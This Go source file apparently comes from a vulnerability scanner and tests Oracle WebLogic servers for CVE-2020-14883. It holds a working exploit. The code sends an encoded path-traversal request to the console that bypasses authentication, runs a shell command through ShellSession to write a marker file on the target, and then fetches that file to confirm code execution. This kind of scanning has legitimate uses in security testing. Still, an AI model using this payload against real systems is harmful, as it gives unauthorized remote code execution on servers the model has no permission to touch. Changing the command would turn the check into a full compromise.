package weblogic

import (
	"github.com/GhostTroops/scan4all/lib/util"
)

func CVE_2020_14883(url string) bool {
	if _, err := util.HttpRequset(url+"/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch%20../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/css/testnmanp.txt%27);%22)", "GET", "", false, nil); err == nil {
		if req2, err2 := util.HttpRequset(url+"/console/framework/skins/wlsconsole/css/testnmanp.txt", "GET", "", false, nil); err2 == nil {
			if req2.StatusCode == 200 {
				util.SendLog(req2.RequestUrl, "CVE-2020-14883", "Found vuln Weblogic", "")
				return true
			}
		}
	}
	return false
}
